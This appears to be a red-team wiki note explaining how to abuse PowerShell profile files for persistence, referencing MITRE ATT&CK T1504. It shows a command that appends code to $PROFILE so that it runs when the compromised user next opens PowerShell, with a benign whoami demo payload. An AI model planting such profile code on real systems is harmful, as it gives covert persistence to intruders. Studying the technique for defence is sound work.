# Powershell Profile Persistence

It's possible to use powershell profiles for persistence and/or privilege escalation.

## Execution

There are four places you can abuse the powershell profile, depending on the privileges you have:

```csharp
$PROFILE | select *
```

![[image (219).png]]

Let's add the code to a `$profile` variable (that expands to the current user's profile file) that will get executed the next time the compromised user launches a powershell console:

```csharp
// attacker@target
echo "whoami > c:\temp\whoami.txt" > $PROFILE
cat $PROFILE
```

![[image (215).png]]

Once the compromised user launches powershell, our code gets executed:

![[image (218).png]]

> [!WARNING]
> If the user is not using profiles, the technique will stick out immediately due to the "loading personal and system profiles..." message at the top.

## References

[attack.mitre.org/techniques/T1504](https://attack.mitre.org/techniques/T1504/)
